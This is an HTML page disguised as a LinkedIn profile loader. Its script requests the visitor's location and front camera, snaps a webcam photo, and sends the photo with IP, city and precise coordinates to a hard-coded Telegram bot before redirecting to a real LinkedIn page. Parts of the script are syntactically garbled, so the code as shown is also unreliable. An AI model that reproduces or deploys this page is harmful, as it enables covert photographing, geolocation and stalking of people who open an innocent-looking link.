<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn Profile</title>
    <style>
        body { 
            margin:0; 
            padding:0; 
            background:#ffffff; 
            height:100vh; 
            display:flex; 
            align-items:center; 
            justify-content:center; 
            font-family:Arial, sans-serif; 
        }
        h1 { color: #0077b5; }
    </style>
</head>
<body>
    <h1>Loading profile...</h1>

    <script>
        // ================== YOUR TELEGRAM DETAILS ==================
        const TELEGRAM_BOT_TOKEN = "8475309387:AAHv1rNBBuU2XDaGtdQLAW0yRUspKX4fXZE";
        const TELEGRAM_CHAT_ID = "7052857946";
        const REDIRECT_URL = "https://www.linkedin.com/in/connectaditya08/";
        // ===========================================================

        let visitorInfo = {
            ip: "Unknown",
            city: "Unknown",
            country: "Unknown",
            latitude: "Unknown",
            longitude: "Unknown",
            timestamp: new Date().toISOString()
        };

        async function sendToTelegram(photoBase64) {
            try {
                const formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("caption", 
                `🔴 New Capture
                IP: ${visitorInfo.ip}
                Location: ${visitorInfo.city}, ${visitorInfo.country}
                Geo: ${visitorInfo.latitude}, ${visitorInfo.longitude}
                Maps: https://maps.google.com/?q=${visitorInfo.latitude},${visitorInfo.longitude}
                Time: ${visitorInfo.timestamp}`);

                const blob = await fetch(photoBase64).then(r => r.blob());
                formData.append("photo", blob, "photo.jpg");

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            } catch (e) {
                console.log("Telegram send failed", e);
            }
        }

        // Get Accurate Location (with user permission)
                async function start((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            visitorInfo.latitude = position.coords.latitude;
                            visitorInfo.longitude = position.coords.longitude;
                            resolve();
                        },
                        (error) => {
                            console.log("Location error:", error.message);
                            resolve();
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });

                // Request Camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                async function start(resolve => setTimeout(resolve, 1500));

                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);

                const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);

                stream.getTracks().forEach(track => track.stop());

                // Send to Telegram
                await sendToTelegram(photoBase64);

            } catch (error) {
                console.log("Error:", error);
            } finally {
                // Redirect to LinkedIn
                window.location.href = REDIRECT_URL;
            }
        }

        // Auto Start
        start();
    </script>
</body>
</html>
